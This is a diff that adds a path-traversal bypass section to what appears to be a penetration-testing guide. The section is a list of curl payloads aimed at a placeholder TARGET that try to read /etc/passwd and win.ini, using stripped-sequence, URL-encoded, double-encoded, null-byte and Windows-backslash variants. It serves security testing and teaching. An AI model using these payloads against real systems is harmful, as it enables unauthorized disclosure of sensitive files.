@@ -99,6 +99,39 @@ Improper file path handling and dynamic inclusion enable sensitive file disclosu
 **Upstream vs Backend Decoding**
 - Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots
 
+### Traversal Bypass Payloads (Practitioner Critical)
+
+When the app strips `../` or blocks specific patterns, use these in order:
+
+```bash
+# Baseline
+curl -sk "https://TARGET/image?filename=../../../etc/passwd"
+
+# If ../ is stripped (non-recursive strip)
+curl -sk "https://TARGET/image?filename=....//....//....//etc/passwd"
+curl -sk "https://TARGET/image?filename=..../\/..../\/..../\/etc/passwd"
+
+# URL encoding (single)
+curl -sk "https://TARGET/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+curl -sk "https://TARGET/image?filename=..%2f..%2f..%2fetc/passwd"
+curl -sk "https://TARGET/image?filename=%2e%2e/..%2f%2e%2e/etc/passwd"
+
+# Double URL encoding (when proxy decodes once, app decodes again)
+curl -sk "https://TARGET/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
+curl -sk "https://TARGET/image?filename=..%252f..%252f..%252fetc/passwd"
+
+# If app requires path to start with expected base directory
+curl -sk "https://TARGET/image?filename=/var/www/images/../../../etc/passwd"
+
+# If app appends extension (.png, .jpg, etc.)
+curl -sk "https://TARGET/image?filename=../../../etc/passwd%00.jpg"  # Null byte (old PHP)
+curl -sk "https://TARGET/image?filename=../../../etc/passwd%0a.jpg"   # Newline
+
+# Windows-specific
+curl -sk "https://TARGET/image?filename=..\\..\\..\\windows\\win.ini"
+curl -sk "https://TARGET/image?filename=..%5c..%5c..%5cwindows%5cwin.ini"
+```
+
 ### LFI Wrappers and Techniques
 
 **PHP Wrappers**
